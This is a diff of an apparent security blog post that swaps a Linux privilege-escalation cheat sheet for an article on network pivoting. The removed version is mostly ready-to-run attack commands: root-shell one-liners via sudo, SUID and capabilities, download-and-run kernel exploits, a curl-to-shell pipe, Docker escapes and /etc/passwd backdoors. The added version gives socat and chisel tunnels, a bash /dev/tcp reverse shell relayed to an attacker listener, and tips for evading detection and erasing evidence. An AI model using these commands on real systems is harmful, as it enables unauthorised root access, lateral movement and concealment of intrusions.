@@ -1,275 +1,205 @@
 ---
 layout: post
-title: "Linux Privilege Escalation Cheat Sheet"
-category: "Privilege Escalation"
-date: 2025-11-18
-readTime: "15 min"
-tags: [linux, privesc, kernel, docker, suid]
-excerpt: "Got a low-priv shell? Here's how to escalate to root. No theory, just techniques that actually work."
+title: "Network Pivoting: Routing Your Access Through Compromised Hosts"
+category: "Network Security"
+date: 2025-11-20
+readTime: "14 min"
+tags: [pivoting, socat, chisel, tunneling, post-exploitation, lateral-movement]
+excerpt: "When your initial compromise sits in a DMZ, the real network is behind it. We explore how attackers bypass network segmentation through pivoting techniques."
 ---
 
-# Linux Privilege Escalation Cheat Sheet
+# Network Pivoting: Routing Your Access Through Compromised Hosts
 
-You popped a shell as `www-data` or some random user. Cool, but you need root. Here's how to get there.
+## The Segmentation Problem
 
-## Start with Enumeration
+Modern networks don't exist as flat, homogeneous landscapes. Instead, they're compartmentalized. Your initial foothold lands in a DMZ or perimeter subnet, valuable for what it reveals, but ultimately not what you're after. The crown jewels sit deeper: domain controllers in internal VLANs, database servers in restricted zones, management interfaces behind additional firewalls.
 
-Don't guess. Enumerate properly:
+This architectural reality creates a fundamental challenge for attackers and defenders alike. Once inside the perimeter, how do you traverse lateral network boundaries? The firewall that stopped your initial reconnaissance now works differently from the inside, but it still exists. Network segmentation isn't just an external defense, it's internal containment.
 
-```bash
-# Quick automated enum
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+This is where pivoting becomes essential. Rather than attacking these internal networks directly (impossible from your external position), you use the compromised host as an intermediary. Every connection routes through the internal network via this gateway machine. The traffic is native to their network, so to their firewalls and IDS systems, it appears legitimate.
 
-# Manual checks
-whoami && id
-sudo -l
-find / -perm -4000 2>/dev/null
-cat /etc/crontab
-```
+## Understanding the Traffic Flow
 
-LinPEAS will highlight potential vectors. Follow the colors.
+Before examining tools, let's establish what actually happens during a pivot. Consider a typical scenario:
 
-## Sudo Misconfigurations
+- Your Kali box is on `10.10.14.0/24` (external)
+- Compromised DMZ host is on `10.10.10.50` (perimeter subnet)
+- Internal network is `192.168.1.0/24` (restricted VLAN)
 
-Check what you can run as root:
+Without pivoting, when you attempt to connect to `192.168.1.100:80` from your Kali box, the firewall drops the traffic. The routing tables on your machine don't even know how to reach that network legitimately.
 
-```bash
-sudo -l
-```
+With pivoting, you establish a tunnel through the DMZ host. Now when you request `localhost:8080` on your machine, the traffic flows through: Kali to DMZ host to Internal host. The firewall sees internal-to-internal traffic, which it permits. The internal host responds through the same path.
 
-If you see **NOPASSWD** on any binary, check [GTFOBins](https://gtfobins.github.io/).
+From the network's perspective, there's nothing unusual. A host on the DMZ is communicating with internal resources. This happens constantly in legitimate environments.
 
-Common wins:
+## SOCAT: The Foundational Approach
 
-```bash
-# find
-sudo find . -exec /bin/sh \; -quit
+SOCAT is fundamentally a bidirectional data relay. It connects two endpoints and shuffles bytes between them. Its power lies in its flexibility. These endpoints can be TCP sockets, Unix sockets, files, processes, or even SSL/TLS connections.
 
-# vim
-sudo vim -c ':!/bin/sh'
+### Basic Port Forwarding
 
-# python
-sudo python -c 'import os; os.system("/bin/sh")'
-
-# less
-sudo less /etc/passwd
-!sh
-```
-
-### Sudo CVE-2021-3156 (Baron Samedit)
-
-If sudo < 1.9.5p2:
+The simplest pivot is a port forward. You listen on a high-numbered port on the compromised host and tunnel connections back to an internal service.
 
 ```bash
-wget https://raw.githubusercontent.com/blasty/CVE-2021-3156/main/hax.c
-gcc hax.c -o hax
-./hax
+socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80
 ```
 
-Instant root if vulnerable.
+This command tells SOCAT: listen on TCP port 8080, and when connections arrive, fork a new process for each one, then connect to the internal web server at 192.168.1.100:80. The `fork` keyword is critical. Without it, only one client could connect before SOCAT closed.
 
-## SUID Binaries
+The operator now points their browser to `dmz-ip:8080` and receives pages from the internal server. The internal firewall sees the DMZ host initiating connections (permitted) and responding to them (expected). There's no indication of external involvement.
 
-SUID files run with owner's permissions. If owned by root, you can abuse them.
+### Reverse Shell Relaying
+
+This becomes more complex when you need to chain compromises. Suppose you've gained a shell on Host A (the DMZ), but your actual target is Host B, which can only be reached from A.
+
+Traditional reverse shell: you catch a reverse shell from Host B on your Kali box, but Host B can't reach Kali directly. This fails at the network boundary.
+
+With SOCAT on Host A:
 
 ```bash
-find / -perm -4000 -type f 2>/dev/null
+# On your Kali
+nc -lvnp 4444
+
+# On Host A (pivot)
+socat TCP-LISTEN:5555,fork TCP:kali-ip:4444
+
+# On Host B (target)
+bash -i >& /dev/tcp/host-a-ip/5555 0>&1
 ```
 
-Look for weird custom binaries or standard tools in odd places.
+Host B connects to Host A on port 5555. SOCAT relays this connection to your Kali listener. The reverse shell arrives at your listener, authenticated through the trusted intermediary. Host B sees it as connecting to Host A. Host A sees it as connecting outbound (which, from an internal perspective, might be permitted by policy). Your Kali sees an inbound connection from Host A.
 
-### Common SUID Exploits
+### Encryption Considerations
+
+As sophistication increases, so does defensive monitoring. A network defender running IDS/IPS systems can fingerprint clear-text protocols. SSH, RDP, and HTTP traffic have distinctive patterns. Encrypted traffic is harder to categorize.
+
+SOCAT supports SSL/TLS wrapping. This doesn't hide the traffic (defenders still see network flows), but it obscures the content from DPI (Deep Packet Inspection) systems.
 
 ```bash
-# python
-/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+# Generate self-signed certificate
+openssl req -newkey rsa:2048 -nodes -keyout pivot.key -x509 -days 365 -out pivot.crt
+cat pivot.key pivot.crt > pivot.pem
 
-# php
-php -r "system('/bin/bash -p');"
+# On the DMZ host
+socat OPENSSL-LISTEN:443,cert=pivot.pem,verify=0,fork TCP:192.168.1.100:3389
 
-# find
-find . -exec /bin/sh -p \; -quit
-
-# nano (if SUID - read/write as root)
-nano /etc/sudoers
+# On your Kali (if you want to access it)
+socat TCP-LISTEN:13389 OPENSSL:dmz-ip:443,verify=0
 ```
 
-Check GTFOBins for the binary you find.
+Now RDP traffic to the internal server flows through an SSL tunnel. From the network's perspective, it's encrypted HTTPS-like traffic. An IDS can flag it as suspicious (why is a DMZ host conducting SSL to internal resources?), but the actual RDP protocol details are hidden.
 
-## Linux Capabilities
+## Chisel: Modern HTTP-Based Tunneling
 
-Capabilities are like sudo permissions but per-file.
+SOCAT is powerful but somewhat dated in its approach. Chisel represents a different design philosophy: assume restrictive firewall policies and design around them.
+
+Many corporate networks permit HTTP and HTTPS outbound traffic. These are fundamental to business operations. An IDS might scrutinize these connections, but blocking them entirely isn't feasible. Chisel exploits this reality by tunneling over HTTP, encrypted via SSH.
+
+### Architecture
+
+Chisel operates on a client-server model. The server runs on your attacking machine (or an intermediate relay). The client runs on the compromised host. They establish an SSH connection over HTTP, which then carries tunnel traffic.
+
+### Reverse Port Forwarding
+
+The most common deployment mirrors SOCAT's port forward but with better encryption.
 
 ```bash
-getcap -r / 2>/dev/null
+# On your Kali (server)
+./chisel server --reverse --port 8000
+
+# On compromised host (client)
+./chisel client kali-ip:8000 R:8080:192.168.1.100:80
 ```
 
-If you see `cap_setuid+ep` on any binary = game over.
+The `--reverse` flag is significant. Normally, the server listens and accepts connections. Here, the client connects to the server and establishes a reverse tunnel. The listening port (`8080`) appears on your Kali machine.
+
+This offers advantages over SOCAT:
+
+- Built-in SSH encryption (SOCAT requires manual SSL setup)
+- Cross-platform compatibility (single binary works on Linux, Windows, macOS)
+- Written in Go, so it's performant
+- The client initiates the connection, which can traverse proxies and NAT
+
+### SOCKS Proxy: The Comprehensive Solution
+
+Rather than forwarding individual ports, Chisel can establish a SOCKS proxy. This is more versatile. Any tool configured to use a SOCKS proxy can tunnel through the compromised host.
 
 ```bash
-# python with cap_setuid
-/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+# On your Kali (server)
+./chisel server --reverse --port 8000
 
-# perl
-/usr/bin/perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'
+# On compromised host (client)
+./chisel client kali-ip:8000 R:socks
 ```
 
-## Kernel Exploits
+Chisel listens on port 1080 on your local machine. Any traffic sent to this port travels through the compromised host and onward to the destination.
 
-Nuclear option. Can crash the box, so use as last resort.
+Now you can use proxychains to route any command through this tunnel:
 
 ```bash
-uname -a  # Check kernel version
+# Edit /etc/proxychains4.conf
+[ProxyList]
+socks5 127.0.0.1 1080
+
+# Use it
+proxychains nmap -sT -Pn 192.168.1.0/24
+proxychains smbclient -L //192.168.1.10
+proxychains evil-winrm -i 192.168.1.10 -u admin -p password
 ```
 
-### Dirty COW (< 4.8.3)
+Every network tool now operates as if you're on the internal network. This is more versatile than individual port forwards. You don't need to predict which services you'll target, you can enumerate the network dynamically.
+
+## Chaining Multiple Pivots
+
+As you progress deeper into a network, you might encounter additional segmentation. Your first compromise reaches a DMZ. Behind that DMZ is a management VLAN. Behind that is the production network. Each boundary requires an additional pivot.
+
+This is theoretically straightforward: the second pivot relays through the first, the third through the second, and so on. In practice, complexity emerges.
 
 ```bash
-wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
-gcc -pthread dirty.c -o dirty -lcrypt
-./dirty
-su firefart  # password: dirtycowfun
+# On Kali
+./chisel server --reverse --port 8000
+
+# On First Pivot (DMZ host)
+./chisel client kali-ip:8000 R:socks &
+./chisel server --port 9000 --reverse
+
+# On Second Pivot (Management VLAN host)
+./chisel client first-pivot-ip:9000 R:9001:third-network-host:80
 ```
 
-### Dirty Pipe (5.8 - 5.16.11)
+You've created a relay chain. Kali connects to the first pivot, establishing a SOCKS proxy. The first pivot connects to the second, forwarding port 9001. Now `localhost:9001` on your Kali reaches deep into the third network.
 
-```bash
-git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
-cd CVE-2022-0847-DirtyPipe-Exploits
-gcc exploit-1.c -o exploit
-./exploit
-```
+The practical limit is usually latency and debugging difficulty, not technical capability. Each hop adds latency. If your attack fails, determining where in the chain the problem exists becomes challenging.
 
-### PwnKit (2021)
+## Operational Security Considerations
 
-```bash
-wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
-chmod +x PwnKit
-./PwnKit
-```
+These techniques work, but they generate evidence. Network defenders analyze traffic patterns, study unusual connections, and review logs.
 
-## Docker Escapes
+When tunneling, consider:
 
-Inside a container? Time to break out.
+- **Port selection**: Avoid high-numbered ports on well-known services. Port 8080 on a DMZ host is suspicious if that host never typically services web traffic.
+- **Volume**: Tunneling large amounts of data (like a full network scan) creates distinctive patterns. Attackers often conduct reconnaissance in smaller batches, spread over time.
+- **Process artifacts**: The chisel or socat binary itself might trigger endpoint detection. Renaming or obfuscating binaries is common practice.
+- **Cleanup**: Removing evidence of tunnels (deleting binaries, clearing command history) is part of the engagement.
 
-### Check if You're in Docker
+## When to Use Each Tool
 
-```bash
-ls -la /.dockerenv
-cat /proc/1/cgroup | grep docker
-```
+**SOCAT** is appropriate when:
+- You need Unix socket manipulation
+- You're already on the target and need quick forwarding
+- SSL/TLS encryption isn't critical
+- The target has limited disk space (SOCAT is smaller)
 
-### Privileged Container
+**Chisel** is appropriate when:
+- You need a persistent, encrypted tunnel
+- The environment has restrictive outbound policies (HTTP/HTTPS allowed)
+- You want cross-platform compatibility
+- You need to tunnel multiple services simultaneously
 
-```bash
-# Test if privileged
-ip link add dummy0 type dummy
+In practice, many engagements use both. SOCAT for initial quick pivots, Chisel for establishing persistent tunnel infrastructure.
 
-# If it works, mount host filesystem
-mkdir /mnt/host
-mount /dev/sda1 /mnt/host
-chroot /mnt/host /bin/bash
-```
+## Conclusion
 
-You're now root on the host.
+Network pivoting bridges the gap between network segmentation and attacker objectives. By converting a compromised host into a relay, attackers access otherwise isolated networks. Defenders implement segmentation specifically to prevent this. The cat-and-mouse dynamic between pivoting techniques and defensive detection remains ongoing.
 
-### Docker Socket Mounted
-
-```bash
-ls -la /var/run/docker.sock
-
-# If exists
-docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-```
-
-Instant root shell on host.
-
-## Cron Jobs
-
-Cron jobs run as root. Find writable scripts.
-
-```bash
-cat /etc/crontab
-ls -la /etc/cron.* 
-```
-
-If you find a writable script:
-
-```bash
-echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/script.sh
-```
-
-Wait for cron to run, then:
-
-```bash
-/tmp/rootbash -p
-```
-
-## Writable /etc/passwd
-
-If `/etc/passwd` is writable (rare but happens):
-
-```bash
-# Generate password hash
-openssl passwd -1 -salt evil yourpassword
-
-# Add new root user
-echo 'hacker:$1$evil$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
-
-# Switch
-su hacker
-```
-
-## PATH Hijacking
-
-If a SUID binary calls a command without full path:
-
-```bash
-# Example: binary calls "ls" instead of "/bin/ls"
-echo '/bin/bash' > /tmp/ls
-chmod +x /tmp/ls
-export PATH=/tmp:$PATH
-
-# Run the SUID binary
-/path/to/suid-binary
-```
-
-It'll execute your fake `ls` which spawns a root shell.
-
-## Escalation Priority
-
-1. **Sudo permissions** - Easiest and safest
-2. **SUID binaries** - Common vector
-3. **Capabilities** - Often overlooked
-4. **Cron jobs** - Reliable if you find one
-5. **Docker escapes** - If in container
-6. **Kernel exploits** - Last resort (can crash system)
-
-## Quick Wins Checklist
-
-```bash
-# 1. Sudo
-sudo -l
-
-# 2. SUID
-find / -perm -4000 2>/dev/null
-
-# 3. Capabilities
-getcap -r / 2>/dev/null
-
-# 4. Cron
-cat /etc/crontab
-
-# 5. Writable files
-find / -writable -type f 2>/dev/null | grep -v proc
-
-# 6. Kernel version
-uname -a
-searchsploit "linux kernel $(uname -r)"
-```
-
-## Resources
-
-- [GTFOBins](https://gtfobins.github.io/) - SUID/sudo exploitation
-- [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) - Comprehensive guide
-- [LinPEAS](https://github.com/carlospolop/PEASS-ng) - Best enum script
+Understanding these techniques is essential for both offensive security professionals and defenders building detection systems. The tools themselves are straightforward, the art lies in deployment: when to use them, how to conceal them, and how to chain them across multiple network boundaries.
